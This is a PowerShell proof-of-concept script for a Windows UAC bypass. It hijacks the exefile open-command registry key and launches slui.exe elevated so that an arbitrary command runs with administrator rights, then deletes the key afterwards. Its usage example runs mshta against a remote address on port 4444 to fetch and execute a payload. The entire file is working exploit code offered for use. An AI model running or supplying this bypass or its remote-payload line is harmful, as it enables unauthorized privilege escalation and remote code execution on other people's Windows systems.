<#
.SYNOPSIS
	This script is a proof of concept to bypass the User Access Control (UAC) via SluiFileHandlerHijackLPE
.NOTES
	Function   : SluiHijackBypass
	File Name  : SluiHijackBypass.ps1
	Author     : Gushmazuko
.LINK
	https://github.com/gushmazuko/WinBypass/blob/master/SluiHijackBypass.ps1
	Original source: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
.EXAMPLE
	Load "cmd.exe" (By Default used 'arch 64'):
	SluiHijackBypass -command "cmd.exe" -arch 64

	Load "mshta http://192.168.0.30:4444/0HUGN"
	SluiHijackBypass -command "mshta http://192.168.0.30:4444/0HUGN"
#>

function SluiHijackBypass(){
	Param (

		[Parameter(Mandatory=$True)]
		[String]$command,
		[ValidateSet(64,86)]
		[int]$arch = 64
	)

	#Create registry structure
	New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $command -Force

	#Perform the bypass
	switch($arch)
	{
		64
		{
			#x64 shell in Windows x64 | x86 shell in Windows x86
			Start-Process "C:\Windows\System32\slui.exe" -Verb runas
		}
		86
		{
			#x86 shell in Windows x64
			C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\slui.exe -Verb runas"
		}
	}

	#Remove registry structure
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force
}